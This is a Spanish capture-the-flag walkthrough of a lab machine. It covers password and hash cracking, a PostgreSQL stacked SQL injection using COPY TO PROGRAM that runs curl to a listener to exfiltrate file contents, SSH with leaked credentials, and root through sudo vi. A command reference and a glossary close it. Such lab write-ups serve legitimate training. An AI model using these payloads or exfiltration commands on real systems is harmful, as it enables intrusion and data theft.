// 02

Crackeo y credenciales

2
ROMPER LA CONTRASEÑA DEL ZIP
JOHN
$ zip2john backup.zip > ziphash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
$ unzip -P 741852963 backup.zip -d backup_x
741852963 (backup.zip)
inflating: backup_x/index.php
inflating: backup_x/style.css
3
ROMPER EL HASH DEL ADMINISTRADOR
JOHN
$ grep -iE 'md5|admin' backup_x/index.php
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt
if (md5($password) === "2cb42f8734ea607eefed3b70af13bbd3") { ... }
qwerty789 (md5.txt)

// CREDENCIALES

admin:qwerty789 — el código fuente del backup entregó el hash MD5 exacto que compara el login; con rockyou.txt se rompe en segundos.

// 03

SQLi y RCE

4
LOGIN Y CONFIRMACIÓN DE LA INYECCIÓN
SQLMAP
$ curl -s -c -b /tmp/vc_c.txt -L -d 'username=admin&password=qwerty789' http://10.129.95.174/index.php
$ sqlmap -u "http://10.129.95.174/dashboard.php?search=Elixir" --cookie="PHPSESSID=<id>" --batch
Parameter: search (GET)
Type: boolean-based blind / error-based
back-end DBMS: PostgreSQL

// SQL INJECTION (POSTGRESQL)

Dónde: dashboard.php?search=, que concatena directamente en SELECT * FROM cars WHERE name ILIKE '%<search>%'.
Qué permite: inyección apilada — no solo leer datos, sino ejecutar otras sentencias en la misma conexión.

5
RCE CON COPY TO PROGRAM
RCE
$ PAYLOAD="Elixir';COPY (SELECT '') TO PROGRAM 'curl -s http://10.10.16.12:8000/vc_beacon';-- -"
$ curl -s -b "PHPSESSID=<id>" -G http://10.129.95.174/dashboard.php --data-urlencode "search=$PAYLOAD"
[listener] GET /vc_beacon — beacon recibido

// OJO

sqlmap --os-cmd detecta la inyección pero no consiguió ejecutar comandos en este objetivo. El payload apilado manual (COPY (SELECT '') TO PROGRAM '…') sí funcionó a la primera — TO PROGRAM solo lo acepta un usuario de PostgreSQL con privilegios de superusuario.

6
EXFILTRAR LA FLAG Y EL CÓDIGO SIN SHELL

En vez de montar una reverse shell, cada comando manda su resultado por la propia URL de un segundo curl hacia un listener HTTP propio — útil porque TO PROGRAM no devuelve salida directamente.

EXFIL
search=Elixir';COPY (SELECT '') TO PROGRAM 'curl -s http://10.10.16.12:8000/flag/$(cat /var/lib/postgresql/user.txt)';-- -
[listener] GET /flag/[flag oculta]
# mismo truco con dashboard.php en base64 url-safe revela: postgres:P@s5w0rd!

// FLAG DE USUARIO Y CREDENCIAL SSH

[flag oculta] — y, en el código de dashboard.php exfiltrado de la misma forma, la cadena de conexión revela postgres:P@s5w0rd!.

// 04

SSH y sudo vi

7
ENTRAR POR SSH Y REVISAR SUDO
SSH
$ sshpass -p 'P@s5w0rd!' ssh postgres@10.129.95.174
postgres@vaccine:~$ echo 'P@s5w0rd!' | sudo -S -l
User postgres may run the following commands:
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

// SUDO SOBRE UN EDITOR = ROOT

Dónde: sudo permite ejecutar vi como root sobre un fichero concreto.
Qué permite: vi tiene un modo de comandos (:!comando) que ejecuta cualquier instrucción del sistema con los mismos privilegios del editor — en este caso, root.

8
ESCALAR Y LEER ROOT.TXT
SUDO VI
# script da un pseudo-TTY; dentro de vi, :!install copia la flag con permisos legibles
postgres@vaccine:~$ cat /tmp/root2.txt
[flag oculta]

// FLAGS

user: [flag oculta] · root: [flag oculta]. Ruta completa: FTP anónimo → backup.zip (john) → MD5 del admin → login → SQLi PostgreSQL (COPY TO PROGRAM) → postgres → SSH → sudo vi → root. Tiempo total: ~30 minutos.

// 05

Referencia Comandos

zip2john / john
zip2john archivo.zip > hash.txt ; john --wordlist=lista hash.txt
Extrae el hash de un zip protegido y lo rompe por diccionario.
john --format=raw-md5
john --format=raw-md5 --wordlist=lista hash.txt
Rompe un hash MD5 suelto (sin formato de archivo), como los que se encuentran en código fuente filtrado.
sqlmap
sqlmap -u "URL?param=valor" --cookie="..." --batch
Detecta y confirma inyecciones SQL automáticamente; útil para identificar el motor y el tipo de inyección antes de explotar a mano.
COPY ... TO PROGRAM
COPY (SELECT '') TO PROGRAM 'comando';-- -
Extensión de PostgreSQL (solo superusuario) que ejecuta un comando del sistema operativo desde una consulta apilada.
sudo -S -l
echo contraseña | sudo -S -l
Lista las reglas de sudo del usuario leyendo la contraseña por stdin, útil sin terminal interactivo.

// 06

Glosario

SQL injection apilada (stacked queries)
Variante de SQLi donde se inyecta una sentencia completa adicional (separada por ;), no solo condiciones dentro de un WHERE. Permite ejecutar INSERT, COPY u otras instrucciones distintas a la original.
COPY TO PROGRAM
Función de PostgreSQL pensada para exportar datos a través de un programa externo. Si el atacante controla el comando y el usuario de BD es superusuario, equivale a ejecución de comandos del sistema.
Exfiltración fuera de banda (out-of-band)
Técnica para sacar datos cuando la inyección no devuelve resultados directamente: el propio objetivo hace una petición HTTP (con los datos en la URL) a un servidor controlado por el atacante.
sudo mal configurado
Regla de sudo que permite ejecutar un programa con capacidades propias de shell (editores, paginadores, intérpretes) como root. GTFOBins documenta decenas de binarios así.
vi — modo comando (:!)
Dentro de vi/vim, :!comando ejecuta un comando de shell con los privilegios del propio editor, sin salir de él.
